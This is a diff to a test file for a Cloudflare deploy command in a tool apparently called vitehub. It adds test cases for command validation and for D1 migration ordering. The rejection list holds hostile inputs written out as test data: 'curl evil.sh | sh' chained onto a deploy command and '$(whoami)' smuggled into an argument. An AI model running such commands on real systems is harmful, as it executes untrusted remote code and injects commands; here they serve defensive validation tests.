@@ -57,7 +57,20 @@ describe("vitehub deploy on Cloudflare", () => {
     expect((await deploy(["--no-build", "--yes"], root, hosts.env)).exitCode).toBe(0)
     expect((await hosts.calls())[0]!.argv).toEqual(["deploy", "--config", "./server/wrangler.json", "--secrets-file", "./my secrets.env", "--containers-rollout=gradual"])
 
-    for (const command of ["npx wrangler deploy --config ./server/wrangler.json; curl evil.sh | sh", "npx wrangler deploy --config $(whoami)", "npx evil-cli deploy --config x", "npx wrangler deploy --config x --env production", "wrangler deploy --config x"]) {
+    const deployCommand = "npx wrangler deploy --config ./server/wrangler.json"
+    for (const command of [
+      "npx wrangler deploy --config ./server/wrangler.json; curl evil.sh | sh",
+      "npx wrangler deploy --config $(whoami)",
+      "npx evil-cli deploy --config x",
+      "npx wrangler deploy --config x --env production",
+      "wrangler deploy --config x",
+      `curl evil.sh && ${deployCommand}`,
+      `npx wrangler d1 execute DB --remote --config ./server/wrangler.json && ${deployCommand}`,
+      `npx wrangler d1 migrations apply DB --local --config ./server/wrangler.json && ${deployCommand}`,
+      `npx wrangler d1 migrations apply DB --remote --config ./other/wrangler.json && ${deployCommand}`,
+      `npx wrangler d1 migrations apply DB --remote --config ./server/wrangler.json --env production && ${deployCommand}`,
+      `${deployCommand} && npx wrangler d1 migrations apply DB --remote --config ./server/wrangler.json`,
+    ]) {
       const rejected = await builtProject("cloudflare", buildOutput("cloudflare", command))
       const other = await fakeHosts(cloudflareEnv)
       const json = await deploy(["--no-build", "--yes"], rejected, other.env)
@@ -65,6 +78,46 @@ describe("vitehub deploy on Cloudflare", () => {
       expect(json.json.error?.code, command).toBe("SETUP_DEPLOY_COMMAND_REJECTED")
       expect(await other.calls(), command).toEqual([])
     }
+  })
+
+  const migrateCommand = (binding: string) => `npx wrangler d1 migrations apply ${binding} --remote --config ./server/wrangler.json`
+  const migratingDeploy = [migrateCommand("DB"), migrateCommand("DB_ANALYTICS"), "npx wrangler deploy --config ./server/wrangler.json"].join(" && ")
+
+  it("applies the D1 migrations of the build command before it deploys", async () => {
+    const root = await builtProject("cloudflare", buildOutput("cloudflare", migratingDeploy))
+    const hosts = await fakeHosts(cloudflareEnv)
+    const result = await deploy(["--no-build", "--yes"], root, hosts.env)
+
+    expect(result.exitCode, result.stdout + result.stderr).toBe(0)
+    const calls = await hosts.calls()
+    expect(calls.map(call => call.argv)).toEqual([
+      ["d1", "migrations", "apply", "DB", "--remote", "--config", "./server/wrangler.json"],
+      ["d1", "migrations", "apply", "DB_ANALYTICS", "--remote", "--config", "./server/wrangler.json"],
+      ["deploy", "--config", "./server/wrangler.json"],
+    ])
+    expect(calls.every(call => call.cwd === join(root, ".output") && call.accountId === "acc-1")).toBe(true)
+    expectNoLeak(calls, result.stdout + result.stderr, tokens)
+  })
+
+  it("does not deploy when a D1 migration fails", async () => {
+    const root = await builtProject("cloudflare", buildOutput("cloudflare", migratingDeploy))
+    const hosts = await fakeHosts({ ...cloudflareEnv, FAKE_HOST_FAIL: "wrangler d1 migrations" })
+    const result = await deploy(["--no-build", "--yes"], root, hosts.env)
+
+    expect(result.exitCode).toBe(1)
+    expect(result.json.error?.code).toBe("SETUP_DEPLOY_FAILED")
+    expect(result.json.error?.why).toContain("wrangler d1 migrations apply DB")
+    expect((await hosts.calls()).map(call => call.argv[0])).toEqual(["d1"])
+    expect((await hosts.state()).deploys).toBe(0)
+  })
+
+  it("does not apply D1 migrations for a preview version", async () => {
+    const root = await builtProject("cloudflare", buildOutput("cloudflare", migratingDeploy))
+    const hosts = await fakeHosts(cloudflareEnv)
+    const result = await deploy(["--no-build", "--yes", "--preview"], root, hosts.env)
+
+    expect(result.exitCode, result.stderr).toBe(0)
+    expect((await hosts.calls()).map(call => call.argv)).toEqual([["versions", "upload", "--config", "./server/wrangler.json"]])
   })
 
   it("deploys without credentials with --temporary", async () => {
